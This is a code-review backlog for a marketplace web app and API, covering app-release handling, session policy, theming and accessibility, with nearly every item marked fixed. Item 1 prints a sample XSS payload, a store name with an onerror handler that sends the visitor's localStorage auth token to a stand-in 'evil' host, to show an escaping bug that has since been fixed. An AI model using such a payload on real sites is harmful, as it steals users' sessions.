# Review Backlog — App Releases, Sessions & Socket Refactor

Findings from a review of the uncommitted work on 2026-08-10.

**Status (2026-08-10, second sweep): items 1-22 are closed.** Item 13 turned out to be a false
positive. Two migrations still need applying to a database, and the branches still need renaming
and committing — see _Before committing_ at the bottom.

Verified after the sweep: `tsc --noEmit` clean in both repos, 51 API tests over 9 suites pass, 22
web tests over 4 files pass, eslint clean on every changed web file, `next build` succeeds across
32 routes.

**A browser pass (same day) then found items 23 and 24, both now also fixed.** Item 23 mattered: the
modal that items 16 and 20 fixed was not the modal the site rendered. The landing page is now wired
to it and the public download path works end to end.

Final state: **items 1-24 closed, item 13 a false positive.** Web repo re-verified after the
rewiring — `tsc` clean, `eslint src` clean, `next build` 32/32, 22 vitest tests pass.

> This backlog spans two repos, so all file paths below are relative to the **workspace root** (`marketPlace/`, the parent of this repo) — not to `mapanytime-api/`. It lives here because most items are API-side; the web items are tracked from here too rather than being split across repos.

**Scope reviewed**

| Repo                    | Branch                 | Diff                                                                                                                                        |
| ----------------------- | ---------------------- | ------------------------------------------------------------------------------------------------------------------------------------------- |
| `mapanytime-api`        | `feat/refactor-revamp` | +308 / −34 across 9 files, plus migration `20260807015958_sync_active_session_and_app_release` and the new `src/modules/appRelease/` module |
| `mapanytime-market-web` | `feat/revamp-refactor` | +1579 / −878 across 14 files, plus 6 new files                                                                                              |

`mapanytime-market-admin` and `mapanytime-market-app` were clean at review time.

Themes in the change: app release management (new `AppRelease` model, admin console, APK download modal), a single-active-device session policy, a shared-socket refactor, and a landing-page redesign.

---

## Blocker

### 1. ~~XSS on the public landing page~~ — FIXED

`mapanytime-market-web/src/components/home/LiveHeroMap.tsx:110-145`

Marker and popup markup is built by string interpolation into `setHTML()` and `el.innerHTML`, with three seller-controlled values unescaped:

```js
background-image: url('${imageUrl}')        // store.logoUrl
<strong>${store.storeName}</strong>
<p>${store.address?.currentAddress || ""}</p>
```

`storeName` and `currentAddress` are seller-supplied and returned by the unauthenticated `/api/v1/stores/nearby`. A store named `<img src=x onerror=fetch('//evil/'+localStorage.token)>` executes in every visitor's browser on the marketing page — and the auth token lives in `localStorage`. `logoUrl` lands inside a CSS `url()`, so a single quote breaks out of the style attribute too.

- [x] Build the marker with `createElement` + `textContent` for `storeName` and `currentAddress`
- [x] Set the logo via `el.style.backgroundImage` through the DOM, not string interpolation
- [x] Move the inline `onmouseover` / `onmouseout` handlers to CSS `:hover` — they break under any CSP without `unsafe-inline`

**Fixed.** `setHTML`/`innerHTML` are gone: `createStorePopupContent` and `createStoreMarkerElement`
build both nodes with `createElement` + `textContent`, and the popup goes through `setDOMContent`.
`safeImageUrl` restricts `logoUrl` to absolute http(s) and re-serialises through the URL parser,
which percent-encodes the `"` that would otherwise break out of the `url("…")` value. All styling,
including the hover state, moved to `.store-marker-pill` / `.store-popup` in `globals.css`.

---

## Correctness — fix before merge

### 2. ~~Neutralize `googleLogin`~~ — FIXED

`mapanytime-api/src/controllers/auth.controller.ts:80`, `mapanytime-api/src/services/auth.service.ts:194`

The route is commented out in `auth.route.ts:9`, but both handlers are compiled, exported, and mint tokens for whatever `email` the request body carries. The explanatory comments are good, but a comment is not a safety mechanism — one uncomment in a future merge is unauthenticated account takeover.

- [x] Delete both handlers, **or** make the service throw unconditionally so re-enabling the route fails loudly
- [x] Decision needed: deletion is cleaner unless the Google OAuth work is imminent

**Fixed — the service body is deleted and `googleLogin` throws 501.** Throw-first-keep-the-body was
tried and rejected: TypeScript stops narrowing in unreachable code, so `tsc` failed on
`'user' is possibly null` — a useful signal that dead auth code doesn't want to be kept around. The
implementation steps live in the doc comment on the stub, and the session layer still carries the
`'google'` provider, so reimplementing is mechanical. The controller keeps its Joi schema and its
SECURITY note; only the service can no longer issue a session.

### 3. ~~Wrap `createRelease` in a transaction~~ — FIXED

`mapanytime-api/src/modules/appRelease/app-release.service.ts:73-92`

`updateMany({ isLatest: false })` runs before `create()`. `version` is `@unique`, so a duplicate-version publish — the most likely failure — leaves the table with no `isLatest` row at all. `setLatestRelease` directly below already uses `$transaction`.

- [x] Mirror the `$transaction` pattern from `setLatestRelease`

**Fixed.** Demote-then-create now runs inside `prisma.$transaction`, so a duplicate-version (or now
duplicate-buildNumber) publish rolls the demotion back instead of leaving no `isLatest` row.

### 4. ~~Fix `rollbackRelease`~~ — FIXED

`mapanytime-api/src/modules/appRelease/app-release.service.ts:96-125`

- [x] Wrap the mark-FAILED + promote-previous pair in a transaction
- [x] Add an existence check so an unknown id returns 404 instead of a Prisma `P2025` surfacing as a 500

**Fixed.** Both writes are in one `$transaction`, preceded by a `findUnique` that throws
`{ status: 404 }`. Also returns the _promoted_ row rather than the pre-update copy, which had been
reporting `activeRelease.isLatest === false` right after promoting it.

### 5. ~~Make `buildNumber` unique~~ — FIXED

`mapanytime-api/prisma/schema.prisma` + new migration

Only `version` is unique today, yet every ordering depends on `buildNumber`: the `isLatest` fallback in `getLatestRelease`, the rollback target, and the admin form's next-build calculation. Duplicates make "the latest release" nondeterministic. The admin page comment at `mapanytime-market-web/src/app/admin/app-releases/page.tsx:65` already claims collisions are rejected — they are not.

- [x] Add `@unique` to `buildNumber` and generate the migration
- [x] Alternative: allow duplicates, delete the misleading comment, and add a deterministic tiebreaker to every `orderBy: { buildNumber: 'desc' }`

**Fixed via the first option.** `buildNumber Int @unique`, in new migration
`20260810075400_app_release_build_number_unique`, which also drops the vestigial column defaults
(item 9) and supersedes the separate index (item 10). Written by hand rather than through
`prisma migrate dev` — no database was reachable from this session, so **`prisma migrate dev` /
`migrate deploy` still needs to run**, and the `CREATE UNIQUE INDEX` will fail if the table already
holds duplicate build numbers.

### 6. ~~Fix the APK URL story~~ — FIXED

`mapanytime-market-web/src/config/app-release.config.ts:23`, `mapanytime-api/src/modules/appRelease/app-release.constants.ts`

`.gitignore` now correctly excludes `/public/downloads/` and `*.apk`, but both fallbacks still point there (`/downloads/latest.apk` and `/downloads/mapanytime-market-v1.0.0.apk`). On a fresh deploy with no published release, the download button and QR code both 404. Deeper mismatch: the API returns a _relative_ path, which `apk-download-modal.tsx:95` resolves against `window.location.origin` — the web origin — but the `.gitignore` comment says the web app should not host the binary.

- [ ] Decide where APKs are hosted (object storage / GitHub Releases) — **still open, your call**
- [x] Make `apkUrl` absolute in both fallbacks
- [x] Disable the download button and QR in the modal when no release is available, instead of linking a guaranteed 404

**Fixed, with the hosting decision deferred rather than pre-empted.** Both fallbacks now carry
`apkUrl: ''` — "nothing published yet" — instead of naming a gitignored file. `resolveApkUrl()` in
the new `useLatestRelease` hook maps empty to `null` and otherwise resolves against the origin, so
an absolute URL from object storage or GitHub Releases passes through untouched and a relative one
still works if the web app ends up hosting the binary. On `null` the modal renders a disabled "No
build published yet" button, disables the QR toggle, and shows history rows as "Unavailable".

Whatever you choose for hosting, publish an **absolute** `apkUrl` through the admin console and no
code needs to change.

---

## Consistency and cleanup

### 7. ~~Use the standard response envelope~~ — FIXED

`mapanytime-api/src/modules/appRelease/app-release.controller.ts`

The only module hand-rolling `{ success: true, data }`. Everything else uses `responseSuccess` → `{ status: 'success', statusCode, data }`. The divergence is already leaking into the client: `LiveHeroMap` checks `json.status === "success"` while `app-release.client.ts` checks only `json.data`.

- [x] Switch the controller to `responseSuccess` / `responseError`
- [x] Update `app-release.client.ts` to read the standard envelope

**Fixed.** All six handlers now go through the helpers, so the module emits
`{ status, statusCode, data, message? }` like everything else. `publicGet` checks
`status === "success"` — matching what `LiveHeroMap` was already doing against the same API.

### 8. ~~Delete `deleteAllSessionsForUser`~~ — FIXED

`mapanytime-api/src/repositories/auth.repository.ts:77` — never called; `rotateSession` does the deletion inline in its transaction.

- [x] Remove it

### 9. ~~Reconcile `minAndroidVersion` defaults~~ — FIXED

Schema said `'8.0+'`, `RELEASE_DEFAULTS` says `'Android 8.0+'`. The constants file already documented the column defaults as vestigial.

- [x] Drop the vestigial `@default()` values in the same migration as item 5

**Fixed.** `channel`, `fileSize`, `minAndroidVersion` and `architecture` lost their `@default()`;
`RELEASE_DEFAULTS` is now the only source. The service already supplied all four, so the create
input staying required is satisfied — verified by regenerating the client and re-running `tsc`.

### 10. ~~Index `AppRelease.buildNumber`~~ — FIXED

Every query sorts by it. Subsumed by item 5 if `@unique` is added.

- [x] Confirm covered by item 5, or add the index

**Covered by item 5** — the unique constraint creates the index.

### 11. ~~Fix the socket refcount churn~~ — FIXED

`mapanytime-market-web/src/shared/lib/socket.ts:47-55`

React runs cleanup before the next effect body, so a `userId` / `channelId` change drops the refcount to 0, disconnects, nulls the socket, then immediately reconnects. Under StrictMode this fires on every mount in dev.

- [x] Defer teardown by a tick and only disconnect if the count is still 0

**Fixed.** `releaseSocket` schedules teardown on a 0ms timer and re-checks the count before
disconnecting; `acquireSocket` cancels any pending timer. A key change or a StrictMode remount now
keeps the same transport.

### 12. ~~Join the base URL properly in `publicGet`~~ — FIXED

`mapanytime-market-web/src/features/app-releases/api/app-release.client.ts:32` — a trailing slash on `NEXT_PUBLIC_API_URL` yields `//api/v1/...`.

- [x] Normalize the join

**Fixed.** Trailing slashes are trimmed off the base before joining. The same normalisation is in
the new `useNearbyStores`.

### 13. ~~Pre-existing: missing leading slash on the storefront route~~ — FALSE POSITIVE

`mapanytime-api/src/modules/stores/store.route.ts:12`

**This finding was wrong.** The line reads `router.get('/:id', StoreController.getById)` and always
has — the file is unmodified in git, so it was a misread on my part, not something that got fixed
in between. Public storefront-by-id works. Recorded here rather than deleted so the same
"correction" doesn't get proposed again.

---

## Decisions needed — all three answered 2026-08-10

### 14. ~~Sign off on the React Query defaults~~ — DECIDED & FIXED

`mapanytime-market-web/src/shared/lib/providers/query-provider.tsx:58`

`refetchOnWindowFocus: false` plus a 60s `staleTime` now applies to **every** query, not just the chatty ones that were tripping the rate limit. Socket-backed data (orders, chat) is covered; everything else goes stale for a minute with no focus refresh.

- [x] Either accept it globally, or scope the change to the specific noisy queries

**Decision: scope it.** Global defaults are back to `refetchOnWindowFocus: true` with a 30s
`staleTime` — short enough to stay fresh, long enough to absorb remount storms. The three
socket-backed queries (`useChatSync`, `useOrdersPipeline`, `useInventoryOrderSync`) opt out
individually by spreading `socketBackedQueryOptions` from the new
`mapanytime-market-web/src/shared/lib/query-options.ts`, which documents why focus-refetch is
pointless for socket-pushed data.

---

## Before committing

- [x] Add a test pinning `findUserById` to a direct DB read — the single-active-device check in `auth.middleware.ts` silently stops working if someone later routes it through `CacheUtil` — **done**: `tests/unit/auth.repository.findUserById.test.ts`, 5 cases covering the direct read, the ACTIVE-by-id filter, `activeSessionId` being returned, `CacheUtil.get`/`set` going untouched, and a second call re-hitting the DB. The CacheUtil assertion first checks `jest.isMockFunction` on both methods, because an earlier version iterated `Object.values(CacheUtil)` — static class methods are non-enumerable, so it asserted nothing and passed vacuously
- [x] Typecheck / lint / build both repos — web `tsconfig.json` gained `@/*`, `@/config/*` and `@/components/*` paths that nothing has compiled against yet — **done**: `tsc --noEmit` passes in both, `eslint` clean on the changed web files, `next build` succeeds (32 routes)
- [ ] `prisma migrate dev` / `migrate deploy` — **two** migrations are untracked now (`20260807015958_sync_active_session_and_app_release` and `20260810075400_app_release_build_number_unique`), and neither has been applied from this session; no DB was reachable
- [ ] Rename one of the branches. `feat/refactor-revamp` (api) and `feat/revamp-refactor` (web) are near-identical inversions of each other and will be confused
- [ ] Commit. Everything above is still uncommitted working-tree change in two repos
- [x] Manual pass in a browser — **done**, see _Third pass_ above. It found item 23 (the fixed modal was unreachable) and item 24 (five more dead font classes); both fixed and re-verified
- [ ] Re-check the download modal against a **real** API once a database is up. The browser pass stubbed `/api/v1/app/latest` and `/history` at the network layer, so the envelope shape was assumed correct rather than observed

---

## Second pass — landing page, theming, admin console

Items 1-14 came from the API and the shared/hook layer. This pass covers what the first review skipped: `page.tsx` (1801 changed lines), `globals.css`, `tailwind.config.ts`, `layout.tsx`, and the back halves of the download modal and admin console. No code had changed between passes.

### 15. ~~Landing-page QR encodes the hardcoded fallback, never the live release~~ — FIXED

`mapanytime-market-web/src/app/page.tsx:118-121`

```js
const apkDownloadUrl = new URL(DEFAULT_APP_RELEASE.apkUrl, window.location.origin).toString();
```

The modal fetches the real release from `/api/v1/app/latest`; this QR does not. The moment a release is published, the two QR codes on the same page point at different URLs — and this one points at `/downloads/latest.apk`, which item 6 establishes is now gitignored and 404s.

- [x] Fetch the live release here too (or lift the fetch to a shared hook the modal and the hero both consume)
- [x] Resolve together with item 6

**Fixed via the shared hook.** `useLatestRelease` (`src/features/app-releases/hooks/`) is now the
single fetch; the hero and the modal both read from it, so the two QR codes cannot disagree. The
hero QR hides itself entirely when no release is published.

### 16. ~~The download modal is hardcoded dark, but the default theme just flipped to light~~ — FIXED

`mapanytime-market-web/src/components/apk-download-modal.tsx`, `src/app/layout.tsx:85`

`layout.tsx` changed `defaultTheme` from `"dark"` to `"light"`. The modal paints itself with `backgroundColor: var(--background-primary, #0f172a)` and then uses `text-white`, `text-gray-300`, `text-gray-400` throughout. In `globals.css:64`, `--background-primary` resolves to `--md-sys-color-background` — the _light_ surface in `:root`. So in the new default theme the modal renders near-white text on a near-white background.

- [x] Convert the modal to MD3 tokens (`bg-surface`, `text-on-surface`, …) like the rest of the redesign
- [x] Check the same pattern in any other component still on the legacy `--background-*` vars

**Fixed.** Every `text-white` / `text-gray-*` / emerald-gradient surface in the modal is now a
token pair (`bg-surface-container-high` + `text-on-surface`, `bg-primary` + `text-on-primary`, …),
so it tracks the theme toggle. The QR panel keeps a literal white background on purpose — QR
contrast is a scanning requirement, and there's a comment saying so.

Audit result for the second checkbox: the modal was the _last_ consumer of the legacy
`background-*` Tailwind aliases, so those four are now deleted from `tailwind.config.ts` (see 22).
The underlying CSS variables stay — the admin and seller-onboarding pages still reference them
directly as `bg-[var(--background-secondary)]`, which is a separate migration.

### 17. ~~Admin banner can label a FAILED release "Live Active Version"~~ — FIXED

`mapanytime-market-web/src/app/admin/app-releases/page.tsx:164`

```js
const activeRelease = releases.find((r) => r.isLatest && r.status === 'ACTIVE') || releases[0];
```

The admin history is fetched with `includeFailed=true`, so `releases[0]` can be a FAILED build. After rolling back the only release, the banner presents it under a "Live Active Version" badge. The rollback button correctly hides itself on non-ACTIVE status, which makes the contradiction more confusing, not less.

- [x] Render an explicit "no active release" state instead of falling back to `releases[0]`

**Fixed.** `activeRelease` is now just `releases.find((r) => r.isLatest && r.status === "ACTIVE")`
with no fallback, and a dedicated panel renders when there isn't one — distinguishing "nothing
published yet" from "everything was rolled back", since the recovery differs. The rollback button
no longer needs its status guard, because the banner only ever shows an ACTIVE release.

### 18. ~~The entire landing page is client-only~~ — FIXED

`mapanytime-market-web/src/app/page.tsx:1,111-113`

`"use client"` plus `if (!mounted) return <div className="min-h-screen bg-background" />` means the server sends an empty shell for the marketing page — no copy, no headings, no links in the initial HTML. The guard is needed for `useTheme`, but it currently gates the whole page rather than just the theme-dependent bits.

- [x] Split the static marketing content into a server component; keep the `mounted` guard around only the theme toggle and other client-only pieces

**Fixed — and the diagnosis in the original finding was half wrong.** `"use client"` was never the
problem: Next prerenders client components on the server too. The blanket
`if (!mounted) return <div className="min-h-screen" />` was doing all the damage on its own, so no
server-component split was needed. That guard is gone; the theme-dependent icon moved into a
`ThemeIcon` component that renders a stable `<Moon />` until mounted, which is the only place
`resolvedTheme` reached the markup.

Verified against the build output rather than by inspection: `.next/server/app/index.html` is now
57 KB and contains "Merchant Ecosystem", "Your Market Journey" and the rest of the copy. It was an
empty shell before.

### 19. ~~`fontFamily` and `fontSize` share the same token names~~ — FIXED

`mapanytime-market-web/tailwind.config.ts`

`body-md`, `body-lg`, `headline-md`, `headline-lg`, `display-xl`, `label-caps` and `button-text` are each defined in **both** maps. So `font-headline-lg` applies only a family and `text-headline-lg` applies the size/weight/tracking — near-identical class names with completely different effects. `layout.tsx:78` already uses `font-body-md`, which sets no size at all; the intent was probably `text-body-md`.

- [x] Rename one axis (e.g. families to `font-display` / `font-body` / `font-mono`) so the two can't be confused
- [x] Audit existing `font-*` usages for ones that meant `text-*`

**Fixed.** Eight family keys for three fonts collapsed to `font-display` / `font-body` /
`font-mono`, and all 38 usages across four files were remapped to the equivalent family — so
rendering is byte-identical and only the names changed. `font-mono` now resolves to JetBrains Mono
(the font the app already loads) instead of Tailwind's default stack.

Audit found two real bugs beyond the naming:

- `layout.tsx` applied `font-body-md` to `<body>`, which set a family and no size. Now
  `font-body text-body-md`, so the document finally has a base type size.
- `globals.css` set `font-family: var(--font-body-md)` on `body` — a variable that is not defined
  anywhere, so the body font silently fell through to the browser default. Now `var(--font-hanken)`.

### 20. ~~Modal accessibility~~ — FIXED

`mapanytime-market-web/src/components/apk-download-modal.tsx:99`

A full-screen modal on the public landing page with no `role="dialog"`, no `aria-modal`, no Escape-to-close, no focus trap, no focus restore on close, no body-scroll lock, and a backdrop that ignores clicks. Keyboard and screen-reader users can't close it or stay inside it.

- [x] Add the dialog semantics and keyboard handling, or move it onto whatever dialog primitive the design system already provides

**Fixed by hand** — there is no dialog primitive in this codebase to move onto. The panel now has
`role="dialog"`, `aria-modal`, `aria-labelledby` pointing at the title, focus moved in on open and
restored to the trigger on close, a Tab/Shift-Tab trap that wraps at both ends, Escape to close,
`overflow: hidden` on the body while open, and a backdrop click that only fires when the click
originated on the backdrop itself.

### 21. ~~Admin console opts out of the design system~~ — DECIDED & FIXED

`mapanytime-market-web/src/app/admin/app-releases/page.tsx:167`

Hardcoded `bg-slate-950 text-slate-100` with Tailwind palette colours throughout. Self-consistent, so it looks fine, but it ignores the MD3 tokens the rest of the app just standardised on and doesn't respond to the theme toggle at all.

- [x] Decide whether admin is deliberately exempt; if not, port it to tokens

**Decision: not exempt — ported.** The whole page is on tokens now, so it follows the theme
toggle. Success/error feedback uses `primary-container` / `error-container` pairs (MD3 has no
"success" role). Two fixes came along with the rewrite: the form's `apkUrl` field no longer
defaults to the gitignored `/downloads/latest.apk` and is now `type="url"` with help text asking
for an absolute URL, and `channel` / `architecture` finally have inputs — both were in component
state and sent to the API, but nothing rendered a control for them.

### 22. Smaller items from this pass — ALL FIXED

- [x] `apk-download-modal.tsx` history rows fall back to a hardcoded `"115.9 MB"` — should read `RELEASE_DEFAULTS` (relates to item 9) — now reads `DEFAULT_APP_RELEASE.fileSize` (the web-side equivalent)
- [x] Three font families totalling 11 weight files (Plus Jakarta ×5, Hanken ×4, JetBrains Mono ×2) load on the public landing page — measure the LCP cost and trim — **trimmed to 9.** Every `font-display` site in `src/` pairs Plus Jakarta with a 600/700/800 type style and none with `font-normal`/`font-medium`, so its 400 and 500 were downloaded and never drawn. Hanken's and JetBrains' weights are all in use; cutting those needs real measurement first, since dropping a used weight causes synthetic-bold fallback
- [x] Legacy colour aliases (`brand-core`, `background-primary`, `background-secondary`, …) are kept in `tailwind.config.ts` "for smooth transition". Needs a removal ticket or it becomes permanent dual-maintenance — **the four `background-*` aliases are deleted** (0 usages once the modal moved to tokens). `brand-core` (6 sites) and `brand-vibrant` (2) stay until those are ported, and the config now says so. Note the _CSS variables_ are untouched and still load-bearing for admin/onboarding
- [x] Landing page carries hardcoded Unsplash URLs as mock storefront imagery (`page.tsx:99` and similar) — confirm that placeholder content is meant to ship — **decision: wire it to real data.** The discovery grid now renders live storefronts from `/stores/nearby` via the new `useNearbyStores` hook, with a loading skeleton and a "no stores near you yet" empty state

  One thing to know about that last one: the mock entries carried **invented ratings and review
  counts** (4.8 stars / 312 reviews, and so on) and `/stores/nearby` returns no such fields. Rather
  than fabricate them against real store names, the card now shows only what the endpoint actually
  returns — name, city, distance, open/closed, logo. If ratings should appear there, the API needs
  to supply them.

  Unsplash images remain elsewhere on the page as decorative section artwork, which is a different
  thing from presenting fake listings as real ones.

---

---

## Third pass — browser verification (2026-08-10)

Dev server on :4000, driven with Playwright (Chromium), both themes, API stubbed where needed.
Screenshots reviewed, not just assertions.

### 23. ~~`ApkDownloadModal` is dead code — the landing page renders its own modal instead~~ — FIXED

`mapanytime-market-web/src/components/apk-download-modal.tsx` vs `src/app/page.tsx:1165`

Nothing imports `ApkDownloadModal`. `grep -rn "apk-download-modal\|ApkDownloadModal" src/` returns
only the component's own declaration. What the "Shop the Market / GET THE APP" button opens is a
**separate inline modal** defined inline in `page.tsx`, which:

- shows two disabled "Coming Soon" buttons and a **"Download APK" button with no `onClick`** — it
  is inert
- carries none of the release metadata: no version, size, checksum, QR, install guide or history
- has no `role="dialog"`, no `aria-modal`, no Escape handler, no focus trap, no body-scroll lock
  (verified in the browser: `role=dialog present=false`, `escapeCloses=false`)

So **items 16 and 20 were fixed on a component users never see**, and the app-release feature —
API module, migration, admin console, client, `useLatestRelease` — currently has no consumer on the
public site beyond the hero QR. The fixes themselves are correct; they are just not reachable.

- [x] **Decision: point `page.tsx` at `ApkDownloadModal` and delete the inline one** — the inline
      modal was a stub and the whole release pipeline exists to feed the real one
- [x] The Android APK button now has a working handler; the same dead-button pattern on the hero
      (`page.tsx:888`) is wired to the same modal

**Fixed and verified in the browser across three states**, with `/api/v1/app/*` stubbed:

| State                    | Result                                                                                           |
| ------------------------ | ------------------------------------------------------------------------------------------------ |
| Published release, light | Full metadata, SHA-256 + Copy, live Download button, QR enabled                                  |
| Published release, dark  | Same, correctly themed — this is the case item 16 was about                                      |
| No release published     | "No build published yet" disabled button, QR toggle greyed, no dead link, no fabricated checksum |

Dialog behaviour confirmed in all three: `focusInside=true`, `scrollLock="hidden"`,
`trapAfterShiftTab=true`, `escClosed=true`, body overflow restored on close.

Also fixed while looking at it: `DEFAULT_APP_RELEASE.whatsNew` had `"✓ "` baked into each string
while the modal renders its own `CheckCircle2` per bullet, so the fallback copy showed a double
tick. Live release notes from the API never carried the prefix, so the two now match.

The two now-unused lucide imports (`Smartphone`, `Star`) were dropped from `page.tsx`.

### 24. Five more font classes that resolve to nothing — FIXED

`mapanytime-market-web/src/app/page.tsx`

Item 19's audit missed these because they were never in the config at all, under either axis:
`font-display-sm` (×2) and `font-headline-sm` (×3). They silently applied no family, so those
headings inherited the body font while their names claimed otherwise.

- [x] Remapped to `font-display`; verified in the browser that `.font-display` computes to
      `"Plus Jakarta Sans"`. Each site already set its own `text-[Npx]` and weight, so only the
      typeface changed — which is what the class names always claimed to do

### What the browser pass confirmed working

- **Item 17** — the exact regression scenario, reproduced with a stubbed FAILED-only history:
  `noActivePanel=true, liveBadge=false`, and the "Every published build is rolled back" copy. The
  old code would have labelled that FAILED build "Live Active Version"
- **Item 21** — admin console renders correctly in both themes and follows the toggle
- **Item 18** — no hydration warnings in either theme after removing the `mounted` guard
- **Items 6/15** — with no release published, the hero QR is absent rather than encoding a 404,
  and the store grid shows the "No stores near you yet" empty state
- **Item 22** — the landing discovery grid renders live-store markup with no invented ratings
- **Item 19** — headline/label type renders in Plus Jakarta and JetBrains Mono as intended

Not reachable in this pass: the real admin data path and `/api/v1/app/latest` responses, since no
database was available — those were stubbed at the network layer.

---

## What is already solid (do not regress)

The session work is the strongest part of the change:

- `rotateSession` correctly wraps purge / create / `activeSessionId` in one transaction
- Putting `sessionId` in the access token avoids a second lookup in `authenticate`
- Rejecting on `activeSessionId === null` is the right call, and the comment explains why
- Carrying `session.provider` through refresh fixes a real relabelling bug
- `findUserById` reads the DB directly rather than `CacheUtil`, so the active-session check cannot be served stale — load-bearing and easy to break later (see the test item above)

Also good: the rate-limit split is correct and `app.use('/api/v1/auth/login', ...)` does match the `app.use('/api', router)` mount; splitting the app-release routers keeps mutations off the public prefix; refusing to promote a `FAILED` release is sound judgment.
